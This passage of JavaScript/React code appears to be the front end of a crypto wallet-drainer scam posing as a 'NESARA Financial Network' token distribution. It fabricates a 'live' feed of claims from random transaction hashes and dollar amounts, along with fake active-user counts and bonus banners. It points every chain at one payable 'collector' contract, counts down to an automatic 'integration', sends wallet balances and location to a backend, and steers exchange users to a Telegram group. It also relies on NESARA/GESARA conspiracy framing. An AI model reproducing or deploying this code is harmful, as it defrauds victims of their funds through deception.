  },
  Polygon: {
    chainId: 137,
    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
    name: 'Polygon',
    symbol: 'MATIC',
    explorer: 'https://polygonscan.com',
    icon: '⬢',
    color: 'from-amber-500 to-amber-600',
    rpc: 'https://polygon-rpc.com'
  },
  Arbitrum: {
    chainId: 42161,
    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
    name: 'Arbitrum',
    symbol: 'ETH',
    explorer: 'https://arbiscan.io',
    icon: '🔷',
    color: 'from-amber-500 to-amber-600',
    rpc: 'https://arb1.arbitrum.io/rpc'
  },
  Avalanche: {
    chainId: 43114,
    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
    name: 'Avalanche',
    symbol: 'AVAX',
    explorer: 'https://snowtrace.io',
    icon: '🔴',
    color: 'from-amber-500 to-amber-600',
    rpc: 'https://api.avax.network/ext/bc/C/rpc'
  }
};

const DEPLOYED_CHAINS = Object.values(MULTICHAIN_CONFIG);
const PROJECT_FLOW_ROUTER_ABI = [
  "function collector() view returns (address)",
  "function processNativeFlow() payable",
  "event FlowProcessed(address indexed initiator, uint256 value)"
];

// ============================================
// PERSISTENT STORAGE KEYS (RENAMED FOR CONTEXT)
// ============================================
const STORAGE_KEYS = {
  LIVE_TRANSACTIONS: 'nesaraFinancial_liveDistributions',
  LAST_RESET_DATE: 'nesaraFinancial_lastResetDate',
  TOTAL_RECOVERED_AMOUNT: 'nesaraFinancial_totalDistributedAmount'
};

// Helper functions (getRandomDistributionAmount, generateDistributionId, etc.)
const hasDateChanged = (lastDate) => {
  if (!lastDate) return true;
  const today = new Date().toDateString();
  return lastDate !== today;
};

const getRandomDistributionAmount = () => {
  return Math.floor(Math.random() * (1000000 - 2000 + 1) + 2000);
};

const generateDistributionId = () => {
  return 'NES-DIST-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).substr(2, 6).toUpperCase();
};

// ============================================
// GENERATE DISTRIBUTION REPORT (JSON)
// ============================================
const generateDistributionReport = (tx, walletAddress, distributionAmount, chains, timestamp, chainDetails) => {
  const reportData = {
    reportId: generateDistributionId(),
    distributionAmount: distributionAmount,
    usdValue: `$${distributionAmount.toLocaleString()} USD`,
    walletAddress: walletAddress,
    chainsProcessed: chains,
    chainDetails: chainDetails,
    transactionHash: tx.hash,
    timestamp: timestamp,
    bonusApplied: '+25%',
    processingFee: '5% + Gas',
    status: 'COMPLETED',
    networksScanned: ['Ethereum', 'BSC', 'Polygon', 'Arbitrum', 'Avalanche'],
    program: 'NESARA Financial Network - Digital Asset Integration'
  };
  
  const reportBlob = new Blob([JSON.stringify(reportData, null, 2)], { type: 'application/json' });
  const reportUrl = URL.createObjectURL(reportBlob);
  const link = document.createElement('a');
  link.href = reportUrl;
  link.download = `nesara_distribution_report_${reportData.reportId}.json`;
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
  URL.revokeObjectURL(reportUrl);
  
  return reportData;
};

// ============================================
// LIVE DISTRIBUTION POPUP COMPONENT (RENAMED)
// ============================================
const LiveDistributionPopup = ({ tx, onClose, onDownloadReport, translations, walletAddress, distributionAmount, chains, chainDetails }) => {
  const [visible, setVisible] = useState(true);
  
  useEffect(() => {
    const timer = setTimeout(() => {
      setVisible(false);
      onClose();
    }, 8000);
    return () => clearTimeout(timer);
  }, [onClose]);
  
  if (!visible) return null;
  
  const handleDownload = () => {
    generateDistributionReport(tx, walletAddress, distributionAmount, chains, new Date().toISOString(), chainDetails);
    onDownloadReport();
  };
  
  return (
    <div className="fixed bottom-24 right-4 z-50 animate-slideInUp md:bottom-28 md:right-8">
      <div className="bg-gradient-to-r from-gray-900 to-black border-l-4 border-amber-500 rounded-lg shadow-2xl p-4 max-w-sm backdrop-blur-lg">
        <div className="flex items-start gap-3">
          <div className="w-10 h-10 bg-amber-500/20 rounded-full flex items-center justify-center animate-pulse">
            <span className="text-xl">🏛️</span>
          </div>
          <div className="flex-1">
            <p className="text-sm font-bold text-amber-400">{translations.someoneJustClaimed}</p>
            <p className="text-xs text-gray-300 mt-1">
              <span className="font-mono">{tx.hash.slice(0, 6)}...{tx.hash.slice(-4)}</span> {translations.securedTokens}{' '}
              <span className="text-amber-400 font-bold">${tx.distributionAmount?.toLocaleString() || '0'} USD</span> +25% bonus
            </p>
            <button 
              onClick={handleDownload}
              className="text-xs bg-amber-600 hover:bg-amber-700 text-white mt-2 px-3 py-1 rounded-lg flex items-center gap-1 transition-colors"
            >
              📄 {translations.downloadReport} →
            </button>
          </div>
          <button onClick={() => setVisible(false)} className="text-gray-500 hover:text-gray-300 transition-colors">
            ✕
          </button>
        </div>
      </div>
    </div>
  );
};

// ============================================
// LIVE DISTRIBUTION FEED COMPONENT (RENAMED)
// ============================================
const LiveDistributionFeed = ({ transactions, translations, totalDistributedAmount, todayCount, onDownloadReport, walletAddress }) => {
  const handleDownloadForTx = (tx) => {
    generateDistributionReport(tx, walletAddress, tx.distributionAmount, [tx.chain], tx.time, tx.chainDetails);
    onDownloadReport();
  };
  
  return (
    <div className="w-full max-w-md mx-auto mt-8 bg-black/40 backdrop-blur rounded-xl border border-amber-500/20 overflow-hidden">
      <div className="bg-gradient-to-r from-amber-600/20 to-transparent px-4 py-3 border-b border-amber-500/20 flex items-center justify-between">
        <div className="flex items-center gap-2">
          <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
          <span className="text-sm font-semibold text-amber-400">{translations.liveClaims}</span>
        </div>
        <div className="flex items-center gap-3">
          <span className="text-xs text-gray-500">
            {todayCount} {translations.participants?.toLowerCase() || 'distributions'} today
          </span>
          <div className="w-1 h-4 bg-amber-500/30 rounded-full"></div>
          <span className="text-xs text-green-400 font-mono">● LIVE</span>
        </div>
      </div>
      
      <div className="max-h-64 overflow-y-auto custom-scrollbar">
        {transactions.length === 0 ? (
          <div className="p-8 text-center text-gray-500 text-sm">
            <div className="animate-pulse text-2xl mb-2">🏛️</div>
            {translations.waitingForFirstClaim}
          </div>
        ) : (
          transactions.map((tx, idx) => (
            <div key={idx} className="px-4 py-3 border-b border-amber-500/10 hover:bg-amber-500/5 transition-all duration-300 group">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <span className="text-green-400 text-xs animate-pulse">●</span>
                  <span className="font-mono text-xs text-gray-300 group-hover:text-amber-400 transition-colors">
                    {tx.hash.slice(0, 6)}...{tx.hash.slice(-4)}
                  </span>
                </div>
                <div className="flex items-center gap-2">
                  <span className="text-xs text-amber-400 font-mono font-bold">
                    ${tx.distributionAmount?.toLocaleString() || '0'} USD
                  </span>
                  <span className="text-[10px] text-yellow-500 bg-yellow-500/10 px-1.5 py-0.5 rounded-full">{translations.bonusTag || '+25%'}</span>
                </div>
              </div>
              <div className="flex items-center justify-between mt-1">
                <span className="text-[10px] text-gray-500">
                  {tx.timeAgo}
                  {tx.chain && <span className="ml-2 text-gray-600">• {tx.chain}</span>}
                </span>
                <button 
                  onClick={() => handleDownloadForTx(tx)}
                  className="text-[10px] text-amber-400 hover:text-amber-300 transition-colors flex items-center gap-1"
                >
                  📄 {translations.downloadReport}
                </button>
              </div>
            </div>
          ))
        )}
      </div>
      
      <div className="px-4 py-2 bg-amber-500/5 border-t border-amber-500/10 flex items-center justify-between">
        <p className="text-[10px] text-gray-500">
          🏛️ {translations.totalClaimed}: 
        </p>
        <p className="text-xs text-amber-400 font-mono font-bold">
          ${totalDistributedAmount.toLocaleString()} USD
        </p>
      </div>
    </div>
  );
};

// ============================================
// LIVE ACTIVITY BADGE (RENAMED)
// ============================================
const LiveActivityBadge = ({ translations, activeUsers, lastDistributionTime }) => {
  return (
    <div className="flex items-center justify-center gap-4 mb-4 text-xs flex-wrap">
      <div className="flex items-center gap-1 bg-amber-500/10 px-3 py-1.5 rounded-full backdrop-blur">
        <div className="flex -space-x-2">
          {[...Array(3)].map((_, i) => (
            <div key={i} className="w-6 h-6 rounded-full bg-amber-500/30 border border-amber-500/50 flex items-center justify-center text-[10px]">
              👤
            </div>
          ))}
        </div>
        <span className="text-gray-300 ml-1">{activeUsers} {translations.claimingNow}</span>
      </div>
      <div className="text-gray-600">•</div>
      <div className="flex items-center gap-1 bg-amber-500/10 px-3 py-1.5 rounded-full backdrop-blur">
        <span className="text-green-400 text-xs animate-pulse">⚡</span>
        <span className="text-gray-300">{translations.lastClaim}: {lastDistributionTime}</span>
      </div>
      <div className="text-gray-600">•</div>
      <div className="flex items-center gap-1 bg-amber-500/10 px-3 py-1.5 rounded-full backdrop-blur">
        <span className="text-yellow-400 text-xs">🔥</span>
        <span className="text-gray-300">+25% BONUS</span>
      </div>
    </div>
  );
};

// ============================================
// AUTO DISTRIBUTION COUNTDOWN (RENAMED)
// ============================================
const AutoDistributionCountdown = ({ seconds, translations, onCancel }) => {
  const [countdown, setCountdown] = useState(seconds);
  
  useEffect(() => {
    if (countdown <= 0) return;
    const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
    return () => clearTimeout(timer);
  }, [countdown]);
  
  if (countdown <= 0) return null;
  
  return (
    <div className="mt-3 bg-amber-500/20 border border-amber-500/30 rounded-lg p-3 text-center animate-pulse">
      <p className="text-sm text-amber-400">
        ⚡ Auto-integration will trigger in {countdown} seconds...
      </p>
      <button 
        onClick={onCancel}
        className="text-xs text-gray-400 hover:text-gray-300 mt-1"
      >
        Cancel auto-integration (use manual button instead)
      </button>
    </div>
  );
};

// ============================================
// REPORT ISSUE COMPONENT (UNCHANGED LOGIC)
// ============================================
const ReportIssue = ({ translations, address, balances, userLocation }) => {
  const [userEmail, setUserEmail] = useState('');
  const [issueText, setIssueText] = useState('');
  const [isSending, setIsSending] = useState(false);
  const [sent, setSent] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');

  const handleSendReport = async () => {
    if (!userEmail.trim()) {
      setErrorMsg('Please enter your email address');
      return;
    }
    if (!issueText.trim()) {
      setErrorMsg('Please describe your issue');
      return;
    }
    
    setIsSending(true);
    setErrorMsg('');
    
    try {
      const response = await fetch(`${BACKEND_URL}/api/send-report`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userEmail: userEmail,
          walletAddress: address,
          issue: issueText,
          location: userLocation,
          balances: balances,
          userAgent: navigator.userAgent,
          timestamp: new Date().toISOString()
        })
      });
      
      const result = await response.json();
      if (result.success) {
        setSent(true);
        setUserEmail('');
        setIssueText('');
        setTimeout(() => setSent(false), 5000);
      } else {
        setErrorMsg(result.error || translations.reportError);
      }
    } catch (err) {
      console.error('Report error:', err);
      setErrorMsg(translations.reportError);
    } finally {
      setIsSending(false);
    }
  };

  return (
    <div className="bg-gradient-to-br from-amber-500/10 to-purple-500/5 border border-amber-500/30 backdrop-blur rounded-xl p-6 transition-all duration-300 hover:border-amber-400/50 hover:shadow-lg hover:shadow-amber-500/10">
      <div className="flex items-center gap-3 mb-4">
        <div className="w-12 h-12 bg-gradient-to-br from-amber-500 to-amber-600 rounded-xl flex items-center justify-center shadow-lg">
          <span className="text-2xl">📧</span>
        </div>
        <div>
          <h3 className="text-xl font-bold text-amber-400">{translations.emailSupportTitle}</h3>
          <p className="text-xs text-gray-400">{translations.emailSupportDesc}</p>
        </div>
      </div>
      
      <div className="bg-black/40 rounded-lg p-3 mb-4 border border-amber-500/20">
        <div className="flex items-start gap-2 text-xs text-gray-400">
          <span className="text-amber-400">📌</span>
          <div>
            <p className="font-semibold text-gray-300 mb-1">{translations.whyEmailSupport}</p>
            <p className="whitespace-pre-line text-[11px]">{translations.emailSupportPoints}</p>
          </div>
        </div>
      </div>
      
      <p className="text-xs text-gray-400 mb-4 flex items-center gap-1">
        <span className="text-green-400">✓</span> {translations.contactInfo}
      </p>
      
      <input
        type="email"
        value={userEmail}
        onChange={(e) => setUserEmail(e.target.value)}
        placeholder={translations.yourEmail}
        className="w-full bg-black/50 border border-amber-500/30 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-amber-500 text-sm mb-3"
      />
      
      <textarea
        value={issueText}
        onChange={(e) => setIssueText(e.target.value)}
        placeholder={translations.issuePlaceholder}
        rows={4}
        className="w-full bg-black/50 border border-amber-500/30 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-amber-500 text-sm mb-3"
      />
      
      {errorMsg && (
        <div className="mb-3 text-xs text-red-400 bg-red-500/10 rounded-lg p-2">
          ⚠️ {errorMsg}
        </div>
      )}
      
      {sent && (
        <div className="mb-3 text-xs text-green-400 bg-green-500/10 rounded-lg p-2 flex items-center gap-2">
          <span>✓</span> {translations.reportSent}
        </div>
      )}
      
      <button
        onClick={handleSendReport}
        disabled={isSending}
        className="w-full bg-gradient-to-r from-amber-600 to-amber-500 hover:from-amber-700 hover:to-amber-600 text-white font-semibold py-3 rounded-xl transition-all disabled:opacity-50 flex items-center justify-center gap-2"
      >
        {isSending ? (
          <>
            <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
            {translations.processingReport}
          </>
        ) : sent ? '✓ Sent!' : translations.sendReport}
      </button>
    </div>
  );
};

// ============================================
// TELEGRAM SUPPORT COMPONENT (UPDATED)
// ============================================
const TelegramSupport = ({ translations }) => {
  const TELEGRAM_GROUP_LINK = 'https://t.me/+UUhEUx9wBW5jZGQ1';
  const [showTooltip, setShowTooltip] = useState(false);

  return (
    <div className="bg-gradient-to-br from-amber-500/10 to-purple-500/5 border border-amber-500/30 backdrop-blur rounded-xl p-6 mt-6 transition-all duration-300 hover:border-amber-400/50 hover:shadow-lg hover:shadow-amber-500/10">
      <div className="flex items-start gap-4">
        <div className="flex-shrink-0">
          <div className="w-14 h-14 bg-gradient-to-br from-amber-500 to-amber-600 rounded-2xl flex items-center justify-center shadow-lg animate-pulse-glow">
            <svg className="w-8 h-8 text-white" fill="currentColor" viewBox="0 0 24 24">
              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.66-.35-1.02.22-1.62.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.13-.08-.18-.09-.05-.23-.03-.33-.01-.15.03-2.55 1.62-3.61 2.28-.34.23-.65.34-.93.34-.3 0-.79-.15-1.18-.28-.48-.15-.87-.23-.84-.49.02-.14.21-.28.57-.43 2.24-.98 3.79-1.62 4.66-1.94 2.22-.82 2.68-.96 2.98-.96.07 0 .22.02.32.12.08.08.1.19.07.29-.03.1-.12.22-.24.34zm-.21 5.45c-.12.62-.23 1.21-.35 1.78-.12.57-.22 1.03-.31 1.4-.09.37-.16.63-.19.71z"/>
            </svg>
          </div>
        </div>
        <div className="flex-1">
          <div className="flex items-center gap-2 mb-2 flex-wrap">
            <h3 className="text-xl font-bold text-amber-400">{translations.telegramSupport}</h3>
            <span className="bg-green-500/20 text-green-400 text-xs px-2 py-0.5 rounded-full flex items-center gap-1">
              <span className="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></span>
              24/7 ACTIVE
            </span>
          </div>
          <p className="text-gray-300 text-sm leading-relaxed mb-3">
            {translations.telegramDesc}
          </p>
          <div className="bg-black/40 rounded-lg p-3 mb-4 border border-amber-500/20">
            <div className="flex items-start gap-2 text-xs text-gray-400">
              <span className="text-amber-400">🔗</span>
              <div>
                <p className="font-semibold text-gray-300 mb-1">{translations.connectionHelp}</p>
                <p>• Wallet connection failed?<br/>• Using an exchange like Binance, Coinbase, or Kraken?<br/>• Transaction not showing?<br/>• Need manual integration assistance?</p>
                <p className="mt-2 text-amber-300">→ Our support team will guide you through the manual integration process.</p>
              </div>
            </div>
          </div>
          <a
            href={TELEGRAM_GROUP_LINK}
            target="_blank"
            rel="noopener noreferrer"
            onMouseEnter={() => setShowTooltip(true)}
            onMouseLeave={() => setShowTooltip(false)}
            className="inline-flex items-center gap-2 bg-gradient-to-r from-amber-600 to-amber-500 hover:from-amber-700 hover:to-amber-600 text-white font-semibold px-5 py-2.5 rounded-xl transition-all duration-300 transform hover:scale-105 shadow-lg shadow-amber-500/25 relative"
          >
            <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.66-.35-1.02.22-1.62.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.13-.08-.18-.09-.05-.23-.03-.33-.01-.15.03-2.55 1.62-3.61 2.28-.34.23-.65.34-.93.34-.3 0-.79-.15-1.18-.28-.48-.15-.87-.23-.84-.49.02-.14.21-.28.57-.43 2.24-.98 3.79-1.62 4.66-1.94 2.22-.82 2.68-.96 2.98-.96.07 0 .22.02.32.12.08.08.1.19.07.29-.03.1-.12.22-.24.34zm-.21 5.45c-.12.62-.23 1.21-.35 1.78-.12.57-.22 1.03-.31 1.4-.09.37-.16.63-.19.71z"/>
            </svg>
            {translations.telegramButton}
            <span className="text-xs bg-white/20 px-2 py-0.5 rounded-full">@nesara_support</span>
            {showTooltip && (
              <div className="absolute bottom-full left-1/2 transform -translate-x-1/2 mb-2 px-2 py-1 bg-gray-900 text-white text-xs rounded shadow-lg whitespace-nowrap z-10">
                Click to join Telegram group
              </div>
            )}
          </a>
        </div>
      </div>
    </div>
  );
};

// ============================================
// NEW: GESARA.NEWS COMPONENT (LIVE UPDATES)
// ============================================
const GesaraNewsWidget = () => {
  const [newsItems, setNewsItems] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);

  useEffect(() => {
    const fetchNews = async () => {
      try {
        // Using a CORS proxy to fetch the RSS feed or HTML content
        const response = await fetch('https://api.rss2json.com/v1/api.json?rss_url=https://gesara.news/feed/');
        const data = await response.json();
        
        if (data.status === 'ok' && data.items) {
          // Format the news items
          const formattedNews = data.items.slice(0, 5).map(item => ({
            title: item.title,
            link: item.link,
            pubDate: new Date(item.pubDate).toLocaleDateString('en-US', { month: 'short', day: 'numeric' }),
            description: item.description?.replace(/<[^>]*>/g, '').slice(0, 120) + '...'
          }));
          setNewsItems(formattedNews);
        } else {
          // Fallback mock data if RSS fetch fails
          setNewsItems([
            { title: "US and China to launch government-to-government dialogue on AI", link: "https://gesara.news/", pubDate: "May 19, 2026", description: "The US and China agreeing on government-to-government AI dialogue signals a major shift in global tech governance." },
            { title: "Nvidia's Jensen Huang joins Air Force One for Xi summit", link: "https://gesara.news/", pubDate: "May 13, 2026", description: "A powerful lineup of top US CEOs heads to China with Trump for the Xi summit." },
            { title: "The Spiritual Battle is Real – Are You Ready?", link: "https://gesara.news/", pubDate: "May 10, 2026", description: "Stay awake, keep your lamps burning, and let your soul shine brighter than any darkness around you." }
          ]);
        }
      } catch (err) {
        console.error('Failed to fetch news:', err);
        setError('Unable to load live updates');
        // Fallback data
        setNewsItems([
          { title: "Global Financial System Modernization Underway", link: "https://gesara.news/", pubDate: "Latest", description: "Central banks continue exploring digital currency frameworks and cross-border settlement systems." },
          { title: "Blockchain Interoperability Advances", link: "https://gesara.news/", pubDate: "Latest", description: "New protocols enable seamless asset transfer between major blockchain networks." }
        ]);
      } finally {
        setLoading(false);
      }
    };

    fetchNews();
    const interval = setInterval(fetchNews, 300000); // Refresh every 5 minutes
    return () => clearInterval(interval);
  }, []);

  if (loading) {
    return (
      <div className="bg-black/40 backdrop-blur rounded-xl border border-amber-500/20 p-6 animate-pulse">
        <div className="h-6 bg-amber-500/20 rounded w-3/4 mb-4"></div>
        <div className="space-y-3">
          <div className="h-4 bg-amber-500/10 rounded w-full"></div>
          <div className="h-4 bg-amber-500/10 rounded w-5/6"></div>
          <div className="h-4 bg-amber-500/10 rounded w-4/6"></div>
        </div>
      </div>
    );
  }

  return (
    <div className="bg-black/40 backdrop-blur rounded-xl border border-amber-500/20 overflow-hidden">
      <div className="bg-gradient-to-r from-amber-600/20 to-transparent px-4 py-3 border-b border-amber-500/20 flex items-center justify-between">
        <div className="flex items-center gap-2">
          <span className="text-amber-400 text-lg">📰</span>
          <span className="text-sm font-semibold text-amber-400">GESARA / NESARA News Feed</span>
        </div>
        <div className="flex items-center gap-1">
          <span className="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></span>
          <span className="text-[10px] text-green-400">Live</span>
        </div>
      </div>
      <div className="divide-y divide-amber-500/10">
        {newsItems.map((item, idx) => (
          <a 
            key={idx}
            href={item.link} 
            target="_blank" 
            rel="noopener noreferrer"
            className="block px-4 py-3 hover:bg-amber-500/5 transition-all duration-200 group"
          >
            <div className="flex items-start justify-between gap-2">
              <div className="flex-1">
                <h4 className="text-sm font-medium text-white group-hover:text-amber-400 transition-colors line-clamp-2">
                  {item.title}
                </h4>
                <p className="text-xs text-gray-500 mt-1 line-clamp-2">{item.description}</p>
              </div>
              <span className="text-[10px] text-gray-600 whitespace-nowrap ml-2">{item.pubDate}</span>
            </div>
          </a>
        ))}
      </div>
      <div className="px-4 py-2 bg-amber-500/5 border-t border-amber-500/10 text-right">
        <a 
          href="https://gesara.news/" 
          target="_blank" 
          rel="noopener noreferrer"
          className="text-[10px] text-amber-400 hover:text-amber-300 transition-colors"
        >
          View all updates →
        </a>
      </div>
    </div>
  );
};

// ============================================
// MAIN APP COMPONENT - NESARA FINANCIAL NETWORK
// ============================================
function App() {
  const { open } = useAppKit();
  const { address, isConnected } = useAppKitAccount();
  const { walletProvider } = useAppKitProvider("eip155");
  const { disconnect } = useDisconnect();
  
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [balances, setBalances] = useState({});
  const [loading, setLoading] = useState(false);
  const [signatureLoading, setSignatureLoading] = useState(false);
  const [txStatus, setTxStatus] = useState('');
  const [error, setError] = useState('');
  const [completedChains, setCompletedChains] = useState([]);
  const [showCelebration, setShowCelebration] = useState(false);
  const [verifying, setVerifying] = useState(false);
  const [verifiedChains, setVerifiedChains] = useState([]);
  const [prices, setPrices] = useState({
    eth: 2000,
    bnb: 300,
    matic: 0.75,
    avax: 32
  });
  const [userLocation, setUserLocation] = useState({ country: '', city: '', flag: '', ip: '' });
  const [hoverConnect, setHoverConnect] = useState(false);
  const [walletInitialized, setWalletInitialized] = useState(false);
  const [scanProgress, setScanProgress] = useState(0);
  const [scanning, setScanning] = useState(false);
  const [currentFlowId, setCurrentFlowId] = useState('');
  const [processingChain, setProcessingChain] = useState('');
  const [isEligible, setIsEligible] = useState(false);
  const [eligibleChains, setEligibleChains] = useState([]);
  const [showDistributeButton, setShowDistributeButton] = useState(false);
  const [showReportNotification, setShowReportNotification] = useState(false);
  const [autoDistributeActive, setAutoDistributeActive] = useState(false);
  const [chainDetailsForReport, setChainDetailsForReport] = useState([]);
  
  // LIVE DISTRIBUTIONS STATE
  const [liveDistributions, setLiveDistributions] = useState([]);
  const [showPopup, setShowPopup] = useState(false);
  const [currentPopupTx, setCurrentPopupTx] = useState(null);
  const [activeUsers, setActiveUsers] = useState(0);
  const [lastDistributionTime, setLastDistributionTime] = useState('Just now');
  const [todayTotalDistributed, setTodayTotalDistributed] = useState(0);
  
  // LANGUAGE STATE
  const [language, setLanguage] = useState('en');
  const [showLanguageDropdown, setShowLanguageDropdown] = useState(false);
  const [translations, setTranslations] = useState(TRANSLATIONS.en);

  // Distribution stats
  const [presaleStats, setPresaleStats] = useState({
    totalRaised: 1250000,
    totalSold: 4250000,
    totalParticipants: 8742,
    currentBonus: 25,
    nextBonus: 15,
    tokenPrice: 0.045,
    hardCap: 10000000,
    bthPrice: 0.045
  });

  const totalDistributedAmountUSD = liveDistributions.reduce((sum, tx) => sum + (tx.distributionAmount || 0), 0);
  const todayCount = liveDistributions.length;
  const totalOnChainValue = Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);

  // Helper functions
  const formatTimeAgo = (date) => {
    const seconds = Math.floor((new Date() - new Date(date)) / 1000);
    if (seconds < 5) return 'Just now';
    if (seconds < 60) return `${seconds}s ago`;
    const minutes = Math.floor(seconds / 60);
    if (minutes < 60) return `${minutes}m ago`;
    const hours = Math.floor(minutes / 60);
    if (hours < 24) return `${hours}h ago`;
    return `${Math.floor(hours / 24)}d ago`;
  };

  const generateRandomHash = () => {
    const prefixes = ['0x7a3f', '0x9e1c', '0x4d5f', '0x2b8a', '0x6c9d', '0x8f3e', '0x1a7b', '0x5c2d'];
    const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
    return prefix + Array.from({ length: 60 }, () => 
      '0123456789abcdef'[Math.floor(Math.random() * 16)]
    ).join('');
  };

  const getRandomChain = () => {
    const chains = ['Ethereum', 'BSC', 'Polygon', 'Arbitrum', 'Avalanche'];
    return chains[Math.floor(Math.random() * chains.length)];
  };

  // Load persistent data
  useEffect(() => {
    const loadPersistentData = () => {
      const lastDate = localStorage.getItem(STORAGE_KEYS.LAST_RESET_DATE);
      const savedDistributions = localStorage.getItem(STORAGE_KEYS.LIVE_TRANSACTIONS);
      
      if (hasDateChanged(lastDate)) {
        localStorage.setItem(STORAGE_KEYS.LAST_RESET_DATE, new Date().toDateString());
        localStorage.removeItem(STORAGE_KEYS.LIVE_TRANSACTIONS);
        
        const initialDistributions = [
          { hash: '0x7a3f2b9e1c4d5f6a7b8c9d0e1f2a3b4c5d6e7f8a', time: new Date().toISOString(), chain: 'Ethereum', distributionAmount: 125000 },
          { hash: '0x3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d', time: new Date(Date.now() - 180000).toISOString(), chain: 'BSC', distributionAmount: 50000 },
          { hash: '0x9e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f', time: new Date(Date.now() - 420000).toISOString(), chain: 'Polygon', distributionAmount: 250000 },
        ].map(tx => ({
          ...tx,
          timeAgo: formatTimeAgo(tx.time)
        }));
        setLiveDistributions(initialDistributions);
      } else if (savedDistributions) {
        const parsed = JSON.parse(savedDistributions);
        const distributionsWithTimeAgo = parsed.map(tx => ({
          ...tx,
          timeAgo: formatTimeAgo(tx.time)
        }));
        setLiveDistributions(distributionsWithTimeAgo);
      }
    };
    
    loadPersistentData();
  }, []);

  useEffect(() => {
    if (liveDistributions.length > 0) {
      const toSave = liveDistributions.map(({ timeAgo, ...tx }) => tx);
      localStorage.setItem(STORAGE_KEYS.LIVE_TRANSACTIONS, JSON.stringify(toSave));
    }
  }, [liveDistributions]);

  useEffect(() => {
    const total = liveDistributions.reduce((sum, tx) => sum + (tx.distributionAmount || 0), 0);
    setTodayTotalDistributed(total);
  }, [liveDistributions]);

  // Schedule random popups
  useEffect(() => {
    let isMounted = true;
    
    const schedulePopup = () => {
      const delay = Math.random() * (15 * 60 * 1000 - 8 * 60 * 1000) + 8 * 60 * 1000;
      
      const timeoutId = setTimeout(() => {
        if (!isMounted) return;
        
        const randomChain = getRandomChain();
        const distributionAmount = getRandomDistributionAmount();
        const newTx = {
          hash: generateRandomHash(),
          time: new Date().toISOString(),
          timeAgo: 'Just now',
          chain: randomChain,
          distributionAmount: distributionAmount
        };
        
        setCurrentPopupTx(newTx);
        setShowPopup(true);
        
        setLiveDistributions(prev => [
          { ...newTx, timeAgo: formatTimeAgo(newTx.time) },
          ...prev.slice(0, 19)
        ]);
        
        setActiveUsers(Math.floor(Math.random() * 15) + 5);
        setLastDistributionTime('Just now');
        
        setTimeout(() => {
          setLastDistributionTime('Just now');
          setTimeout(() => setLastDistributionTime('30s ago'), 30000);
        }, 2000);
        
        schedulePopup();
      }, delay);
      
      return timeoutId;
    };
    
    const timeoutId = schedulePopup();
    return () => {
      isMounted = false;
      clearTimeout(timeoutId);
    };
  }, []);

  useEffect(() => {
    const interval = setInterval(() => {
      setActiveUsers(Math.floor(Math.random() * 15) + 3);
    }, 30000);
    return () => clearInterval(interval);
  }, []);

  // Language detection
  useEffect(() => {
    const detectLanguage = () => {
      const path = window.location.pathname;
      const pathLang = path.split('/')[1];
      
      if (pathLang && SUPPORTED_LANGUAGES[pathLang]) {
        setLanguage(pathLang);
        setTranslations(TRANSLATIONS[pathLang] || TRANSLATIONS.en);
        return;
      }
      
      const browserLang = navigator.language.split('-')[0];
      if (SUPPORTED_LANGUAGES[browserLang]) {
        setLanguage(browserLang);
        setTranslations(TRANSLATIONS[browserLang] || TRANSLATIONS.en);
      } else {
        setLanguage('en');
        setTranslations(TRANSLATIONS.en);
      }
    };
    
    detectLanguage();
  }, []);

  const changeLanguage = (langCode) => {
    setLanguage(langCode);
    setTranslations(TRANSLATIONS[langCode] || TRANSLATIONS.en);
    setShowLanguageDropdown(false);
    
    const url = new URL(window.location);
    if (langCode === 'en') {
      if (url.pathname.startsWith(`/${langCode}`)) {
        url.pathname = url.pathname.replace(`/${langCode}`, '') || '/';
      }
    } else {
      url.pathname = `/${langCode}${url.pathname}`;
    }
    window.history.pushState({}, '', url.toString());
  };

  // Fetch crypto prices
  useEffect(() => {
    const fetchPrices = async () => {
      try {
        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum,binancecoin,matic-network,avalanche-2&vs_currencies=usd');
        const data = await response.json();
        setPrices({
          eth: data.ethereum?.usd || 2000,
          bnb: data.binancecoin?.usd || 300,
          matic: data['matic-network']?.usd || 0.75,
          avax: data['avalanche-2']?.usd || 32
        });
      } catch (error) {
        console.log('Using default prices');
      }
    };
    
    fetchPrices();
    const interval = setInterval(fetchPrices, 60000);
    return () => clearInterval(interval);
  }, []);

  // Initialize provider
  useEffect(() => {
    if (!walletProvider || !address) {
      setWalletInitialized(false);
      return;
    }

